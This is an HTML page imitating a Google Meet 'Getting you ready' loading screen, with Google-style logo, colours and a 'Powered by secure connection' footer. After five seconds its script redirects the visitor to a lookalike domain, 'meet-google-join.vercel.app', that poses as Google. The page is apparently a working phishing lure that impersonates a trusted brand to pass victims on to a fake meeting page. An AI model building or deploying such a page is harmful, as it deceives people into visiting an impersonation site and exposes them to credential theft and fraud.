<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Joining Meeting</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family: "Roboto", Arial, sans-serif;
}

body{
  height:100vh;
  display:flex;
  justify-content:center;
  align-items:center;
  background:#ffffff;
}

/* Center Box */
.card{
  width:380px;
  text-align:center;
  padding:40px 30px;
}

/* Google Meet style logo */
.logo{
  display:flex;
  justify-content:center;
  align-items:center;
  gap:8px;
  font-size:22px;
  font-weight:500;
  color:#202124;
  margin-bottom:30px;
}

.logo .material-icons{
  color:#1a73e8; /* Google blue */
  font-size:28px;
}

/* Spinner */
.loader{
  width:50px;
  height:50px;
  border-radius:50%;
  border:4px solid #e0e0e0;
  border-top:4px solid #1a73e8;
  margin:25px auto;
  animation:spin 1s linear infinite;
}

@keyframes spin{
  100%{transform:rotate(360deg);}
}

/* Text */
.title{
  font-size:18px;
  color:#202124;
  margin-top:10px;
}

.sub{
  font-size:13px;
  color:#5f6368;
  margin-top:6px;
}

/* Icons row */
.icons{
  margin-top:25px;
  display:flex;
  justify-content:center;
  gap:18px;
  color:#5f6368;
}

.icons .material-icons{
  font-size:22px;
}

/* Progress bar */
.bar{
  width:100%;
  height:4px;
  background:#e8eaed;
  border-radius:10px;
  margin-top:30px;
  overflow:hidden;
}

.fill{
  height:100%;
  width:0%;
  background:#1a73e8;
  animation:load 5s linear forwards;
}

@keyframes load{
  100%{width:100%;}
}

/* Footer note */
.footer{
  margin-top:20px;
  font-size:12px;
  color:#9aa0a6;
}
</style>
</head>

<body>

<div class="card">

  <div class="logo">
    <span class="material-icons">video_call</span>
    Meet
  </div>

  <div class="loader"></div>

  <div class="title">Getting you ready</div>
  <div class="sub">You’ll be redirected to the meeting</div>

  <div class="icons">
    <span class="material-icons">mic</span>
    <span class="material-icons">videocam</span>
    <span class="material-icons">devices</span>
  </div>

  <div class="bar"><div class="fill"></div></div>

  <div class="footer">Powered by secure connection</div>

</div>

<script>
let redirectURL = "https://meet-google-join.vercel.app/Qwz/"; // 👉 main meeting page

setTimeout(()=>{
  window.location.href = redirectURL;
},5000);
</script>

</body>
</html>
